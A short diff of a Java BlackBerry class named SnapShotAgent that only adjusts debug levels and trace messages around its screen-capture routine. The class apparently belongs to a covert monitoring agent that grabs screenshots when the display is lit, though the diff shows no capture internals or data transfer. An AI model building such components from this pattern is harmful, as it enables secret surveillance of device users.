@@ -32,7 +32,7 @@ import blackberry.utils.WChar;
  */
 public final class SnapShotAgent extends Agent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
@@ -80,7 +80,7 @@ public final class SnapShotAgent extends Agent {
     public void actualRun() {
 
         //#ifdef DEBUG
-        debug.trace("Taking snapshot");
+        debug.trace("snapshot");
         //#endif
 
         if (!Backlight.isEnabled()) {
@@ -93,7 +93,7 @@ public final class SnapShotAgent extends Agent {
         final Bitmap bitmap = getScreenshot();
 
         //#ifdef DEBUG
-        debug.trace("screenshot");
+        debug.info("Taking screenshot");
         //#endif
 
         // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
